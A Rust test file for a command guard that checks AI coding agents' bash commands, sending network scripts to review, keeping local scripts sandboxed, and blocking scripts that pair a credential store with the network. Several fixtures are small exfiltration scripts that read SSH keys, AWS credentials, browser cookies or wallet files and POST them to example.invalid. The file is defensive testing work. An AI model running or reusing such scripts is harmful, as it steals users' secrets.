//! What a script does decides where it runs. A script that needs the network
//! keeps its review instead of failing in a sandbox without one, a script that
//! pairs a credential store with the network is blocked, and a local script
//! keeps its workspace sandbox.
use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use guard_contracts::PreToolResultV1;
use serde_json::json;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicUsize, Ordering};

const CONTAINED: &str = "native_workspace_containment_required";
const REVIEW: &str = "native_command_review_required";
const EXFILTRATION: &str = "native_secret_exfiltration";

/// A home and project below the target directory: macOS `$TMPDIR` resolves
/// under `/private/var`, which the sensitive-path screen rejects.
struct Fixture {
    home: PathBuf,
    project: PathBuf,
}

impl Fixture {
    fn new() -> Self {
        static NEXT: AtomicUsize = AtomicUsize::new(0);
        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../target/script-content-tests")
            .join(format!(
                "run-{}-{}",
                std::process::id(),
                NEXT.fetch_add(1, Ordering::Relaxed)
            ));
        let project = root.join("project");
        std::fs::create_dir_all(project.join(".git")).unwrap();
        std::fs::write(project.join(".git/config"), "[core]\n\tbare = false\n").unwrap();
        let home = root.canonicalize().unwrap();
        let project = project.canonicalize().unwrap();
        Self { home, project }
    }

    fn write(&self, relative: &str, text: &str) {
        let path = self.project.join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    fn classify(&self, harness: &str, command: &str) -> PreToolResultV1 {
        evaluate_pre_tool_envelope_with_context(
            harness,
            "PreToolUse",
            &json!({"tool_name": "bash", "tool_input": {"command": command}}),
            Some(&controls()),
            None,
            self.home.to_str(),
            self.project.to_str(),
        )
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.home);
    }
}

fn controls() -> guard_command::native_command_controls::CompiledNativeCommandControls {
    let program = guard_command::native_command_program::packaged_command_program().unwrap();
    let mut binding: guard_contracts::NativeCommandControlBindingV1 =
        serde_json::from_value(json!({
            "schema": "guard.native-command-control-binding.v1",
            "program_digest": program.program_digest,
            "catalog_digest": program.catalog_digest,
            "trust_digest": program.trust_digest,
            "health": "protected",
            "revision": 1,
            "managed_revision": 0,
            "effective_digest": "",
            "layers": []
        }))
        .unwrap();
    binding.effective_digest = binding.compute_effective_digest().unwrap();
    guard_command::native_command_controls::CompiledNativeCommandControls::new(&binding).unwrap()
}

#[test]
fn a_network_script_keeps_its_review_instead_of_a_sandbox_without_network() {
    let fixture = Fixture::new();
    fixture.write(
        "scripts/ga4-report.mjs",
        "import { BetaAnalyticsDataClient } from '@google-analytics/data';\nconst client = new BetaAnalyticsDataClient();\nconsole.log(await client.runReport({}));\n",
    );
    fixture.write(
        "scripts/status.mjs",
        "const response = await fetch(process.argv[2]);\nconsole.log(response.status);\n",
    );
    fixture.write(
        "scripts/sync.py",
        "import json\nfrom helpers import upload\nupload(json.load(open('data.json')))\n",
    );
    fixture.write(
        "scripts/helpers.py",
        "import requests\n\ndef upload(rows):\n    requests.post('https://example.invalid/rows', json=rows)\n",
    );
    fixture.write(
        "scripts/main.ts",
        "import { send } from './lib/client';\nsend();\n",
    );
    fixture.write(
        "scripts/lib/client.ts",
        "import https from 'node:https';\nexport const send = () => https.get('https://example.invalid');\n",
    );
    for harness in ["omp", "zcode", "claude-code", "codex"] {
        for command in [
            "node scripts/ga4-report.mjs",
            "node --no-warnings scripts/status.mjs https://example.invalid",
            "python3 scripts/sync.py",
            "tsx scripts/main.ts",
            "bun run scripts/main.ts",
        ] {
            let result = fixture.classify(harness, command);
            assert_eq!(result.decision, "deny", "{harness}: {command}");
            assert_eq!(result.minimum_action, "review", "{harness}: {command}");
            // `bun run` may name a package script, so it keeps its package review.
            let expected = if command.starts_with("bun run") {
                "native_package_review"
            } else {
                REVIEW
            };
            assert_eq!(result.reason_code, expected, "{harness}: {command}");
        }
    }
    if cfg!(target_os = "macos") {
        let result = fixture.classify("omp", "node scripts/status.mjs");
        assert!(
            result.reason.contains("uses the network"),
            "{}",
            result.reason
        );
    }
}

#[test]
fn a_local_script_keeps_its_workspace_sandbox() {
    let fixture = Fixture::new();
    fixture.write(
        "scripts/report.mjs",
        "import { readFile } from 'node:fs/promises';\n// Source: https://example.invalid/docs\nconsole.log((await readFile('data.json', 'utf8')).length);\n",
    );
    fixture.write(
        "scripts/tally.py",
        "import csv, json\nfrom pathlib import Path\nprint(json.dumps(list(csv.reader(Path('rows.csv').open()))))\n",
    );
    // A public key names no credential store.
    fixture.write(
        "scripts/keys.py",
        "from pathlib import Path\nprint(Path('deploy/id_ed25519.pub').read_text())\n",
    );
    for command in [
        "node scripts/report.mjs",
        "python3 scripts/tally.py",
        "python3 scripts/keys.py",
    ] {
        let result = fixture.classify("omp", command);
        assert_ne!(result.decision, "allow", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(result.minimum_action, "sandbox-required", "{command}");
            assert_eq!(result.reason_code, CONTAINED, "{command}");
        }
    }
}

#[test]
fn a_script_pairing_a_credential_store_with_the_network_is_blocked() {
    let fixture = Fixture::new();
    fixture.write(
        "collect.py",
        "import os, requests\nkey = open(os.path.expanduser('~/.ssh/id_ed25519')).read()\nrequests.post('https://example.invalid', data=key)\n",
    );
    fixture.write(
        "cookies.mjs",
        "import { readFileSync } from 'node:fs';\nimport { homedir } from 'node:os';\nconst db = readFileSync(`${homedir()}/Library/Application Support/Google/Chrome/Default/Cookies`);\nawait fetch('https://example.invalid', { method: 'POST', body: db });\n",
    );
    // The credential read and the upload sit in different local modules.
    fixture.write(
        "tools/run.js",
        "const creds = require('./creds');\nconst send = require('./send');\nsend(creds());\n",
    );
    fixture.write(
        "tools/creds.js",
        "const fs = require('fs');\nmodule.exports = () => fs.readFileSync(process.env.HOME + '/.aws/credentials');\n",
    );
    fixture.write(
        "tools/send.js",
        "const axios = require('axios');\nmodule.exports = (body) => axios.post('https://example.invalid', body);\n",
    );
    // Test-named scripts are read too.
    fixture.write(
        "wallet_test.py",
        "import urllib.request\nurllib.request.urlopen('https://example.invalid', open('wallet.dat', 'rb').read())\n",
    );
    for harness in ["omp", "claude-code", "codex", "cursor"] {
        for command in [
            "python3 collect.py",
            "node cookies.mjs",
            "node tools/run.js",
            "python3 wallet_test.py",
            "cd tools && node run.js",
            "timeout 30 python3 collect.py",
        ] {
            let result = fixture.classify(harness, command);
            if command.starts_with("cd ") {
                // An earlier directory change leaves a relative script unread.
                assert_ne!(result.decision, "allow", "{harness}: {command}");
                continue;
            }
            assert_eq!(result.decision, "deny", "{harness}: {command}");
            assert_eq!(result.minimum_action, "block", "{harness}: {command}");
            assert_eq!(result.reason_code, EXFILTRATION, "{harness}: {command}");
        }
    }
}

#[test]
fn credential_names_without_the_network_or_network_without_credentials_are_not_blocked() {
    let fixture = Fixture::new();
    fixture.write(
        "check_keys.py",
        "from pathlib import Path\nprint(Path.home().joinpath('.ssh/id_rsa').exists())\n",
    );
    fixture.write(
        "deploy.mjs",
        "const token = process.env.API_TOKEN;\nawait fetch('https://example.invalid', { headers: { authorization: token } });\n",
    );
    fixture.write(
        "netrc_upload.py",
        "import netrc, requests\nauth = netrc.netrc().authenticators('example.invalid')\nrequests.get('https://example.invalid', auth=auth[::2])\n",
    );
    // A comment that names a credential store opens nothing.
    fixture.write(
        "status.mjs",
        "// Deploy keys live in ~/.ssh/id_ed25519; this script never reads them.\n/* Old: ~/.aws/credentials */\nconst response = await fetch(process.argv[2]); // not ~/.ssh/id_rsa\nconsole.log(response.status);\n",
    );
    fixture.write(
        "notify.py",
        "# Reads no wallet.dat; see the runbook.\nimport requests\nrequests.get('https://example.invalid')  # not ~/.aws/credentials\n",
    );
    // `is_valid_rsa` names no key file.
    fixture.write(
        "jwks.py",
        "import requests\n\ndef is_valid_rsa(key):\n    return key.get('kty') == 'RSA'\n\nprint([is_valid_rsa(k) for k in requests.get('https://example.invalid/jwks').json()['keys']])\n",
    );
    for command in [
        "python3 jwks.py",
        "python3 check_keys.py",
        "node deploy.mjs",
        "python3 netrc_upload.py",
        // Each script does one of the two; neither pairs them.
        "python3 check_keys.py && node deploy.mjs",
        "node status.mjs https://example.invalid",
        "python3 notify.py",
    ] {
        let result = fixture.classify("omp", command);
        assert_ne!(result.reason_code, EXFILTRATION, "{command}");
        assert_ne!(result.minimum_action, "block", "{command}");
    }
}

#[test]
fn launches_whose_script_is_not_read_keep_their_existing_route() {
    let fixture = Fixture::new();
    fixture.write("scripts/report.mjs", "console.log(1);\n");
    for command in [
        "node scripts/missing.mjs",
        "node -e \"fetch('https://example.invalid')\"",
        "python3 -c 'import socket'",
        "python3 -m http.server",
        "node scripts",
    ] {
        let result = fixture.classify("omp", command);
        assert_ne!(result.reason_code, EXFILTRATION, "{command}");
        assert_ne!(result.decision, "allow", "{command}");
    }
    // A test-named script that imports a client keeps its read-only profile:
    // tests that import one usually stub it.
    fixture.write(
        "api.test.mjs",
        "import axios from 'axios';\nimport test from 'node:test';\ntest('x', () => axios);\n",
    );
    let result = fixture.classify("omp", "node api.test.mjs");
    if cfg!(target_os = "macos") {
        assert_eq!(
            result.reason_code, "native_node_eval_readonly_containment_required",
            "{}",
            result.reason
        );
    }
}

#[test]
fn local_modules_are_read_through_packages_submodules_and_past_an_unreadable_one() {
    let fixture = Fixture::new();
    // A local package directory loads the file its manifest names.
    fixture.write(
        "tools/run.js",
        "const client = require('./client');\nclient.send();\n",
    );
    fixture.write(
        "tools/client/package.json",
        "{\"name\": \"client\", \"main\": \"src/send.js\"}\n",
    );
    fixture.write(
        "tools/client/src/send.js",
        "const axios = require('axios');\nexports.send = () => axios.get('https://example.invalid');\n",
    );
    // `from pkg import name` loads the submodule `pkg/name.py`.
    fixture.write("jobs/main.py", "from uploads import sender\nsender.run()\n");
    fixture.write("jobs/uploads/__init__.py", "");
    fixture.write(
        "jobs/uploads/sender.py",
        "import requests\n\ndef run():\n    requests.get('https://example.invalid')\n",
    );
    // A module in a package imports by absolute name from the script's
    // directory, and by relative name from its package's parents.
    fixture.write(
        "absolute/main.py",
        "from tasks import upload\nupload.run()\n",
    );
    fixture.write("absolute/tasks/__init__.py", "");
    fixture.write(
        "absolute/tasks/upload.py",
        "import netclient\n\ndef run():\n    netclient.send()\n",
    );
    fixture.write(
        "absolute/netclient.py",
        "import requests\n\ndef send():\n    requests.get('https://example.invalid')\n",
    );
    fixture.write("relative/main.py", "from pkg.sub import run\nrun()\n");
    fixture.write("relative/pkg/__init__.py", "");
    fixture.write(
        "relative/pkg/sub/__init__.py",
        "from ..net import send\n\ndef run():\n    send()\n",
    );
    fixture.write(
        "relative/pkg/net.py",
        "import requests\n\ndef send():\n    requests.get('https://example.invalid')\n",
    );
    // An oversized module is left out; the network use beside it still counts.
    fixture.write(
        "big/entry.mjs",
        "import './vendor.mjs';\nconst response = await fetch(process.argv[2]);\nconsole.log(response.status);\n",
    );
    fixture.write(
        "big/vendor.mjs",
        &format!("export const table = '{}';\n", "x".repeat(300 * 1024)),
    );
    for command in [
        "node tools/run.js",
        "python3 jobs/main.py",
        "python3 absolute/main.py",
        "python3 relative/main.py",
        "node big/entry.mjs https://example.invalid",
    ] {
        let result = fixture.classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        assert_eq!(result.minimum_action, "review", "{command}");
        assert_eq!(result.reason_code, REVIEW, "{command}");
    }
    // A credential read past the oversized module is still paired with the network.
    fixture.write(
        "big/collect.mjs",
        "import './vendor.mjs';\nimport { key } from './key.mjs';\nawait fetch('https://example.invalid', { method: 'POST', body: key });\n",
    );
    fixture.write(
        "big/key.mjs",
        "import { readFileSync } from 'node:fs';\nimport { homedir } from 'node:os';\nexport const key = readFileSync(`${homedir()}/.ssh/id_ed25519`);\n",
    );
    let result = fixture.classify("omp", "node big/collect.mjs");
    assert_eq!(result.minimum_action, "block");
    assert_eq!(result.reason_code, EXFILTRATION);
}

#[test]
fn a_review_held_for_another_reason_keeps_that_reason() {
    let fixture = Fixture::new();
    fixture.write(
        "scripts/status.mjs",
        "const response = await fetch(process.argv[2]);\nconsole.log(response.status);\n",
    );
    let result = fixture.classify("omp", "npm install left-pad && node scripts/status.mjs");
    assert_ne!(result.decision, "allow");
    assert!(
        !result.reason.contains("uses the network"),
        "{}: {}",
        result.reason_code,
        result.reason
    );
}
